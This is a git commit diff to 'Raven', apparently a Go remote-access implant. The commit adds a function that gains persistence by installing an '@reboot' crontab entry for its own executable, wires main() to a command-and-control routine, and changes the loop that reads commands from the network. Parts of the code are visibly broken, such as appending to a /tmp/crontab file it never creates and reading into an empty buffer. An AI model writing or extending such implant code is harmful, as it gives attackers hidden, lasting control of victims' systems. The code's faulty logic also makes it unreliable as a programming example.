bb542c10fa9d24143743c607a1c326bc8af74761
Nemuel Wainaina <bR0S3@protonmail.com>
2023-02-25 12:45:34 +0300

    Add function to achieve persistence

--- raven.go
+++ raven.go
@@ -1,9 +1,13 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"net"
 	"net/http"
+	"os"
+	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -14,6 +18,31 @@ const (
 
 func main() {
 	fmt.Println("[*] Initializing Raven ...")
+	reach_command_and_control()
+}
+
+func persist() {
+	// achieve persistence by creating a cronjob
+	flag := "raven"
+	file, _ := os.Open("/etc/crontab")
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, flag) {
+			return
+		}
+	}
+
+	cmd := exec.Command("crontab", "-e")
+	cmd.Run()
+	f, _ := os.OpenFile("/tmp/crontab", os.O_APPEND|os.O_WRONLY, 0644)
+	file_path, _ := os.Executable()
+	line := fmt.Sprintf("@reboot %s", file_path)
+	fmt.Fprintln(f, line)
+	cmd = exec.Command("crontab", "/tmp/crontab")
+	cmd.Run()
+	os.Remove("/tmp/crontab")
+
 }
 
 func has_internet_access() bool {
@@ -40,7 +69,8 @@ func reach_command_and_control() {
 
 func engage_via(conn net.Conn) {
 	for {
-		var cmd []byte
-		conn.Read(cmd)
+		var cmd string
+		conn.Read([]byte(cmd))
+		fmt.Println(cmd)
 	}
 }
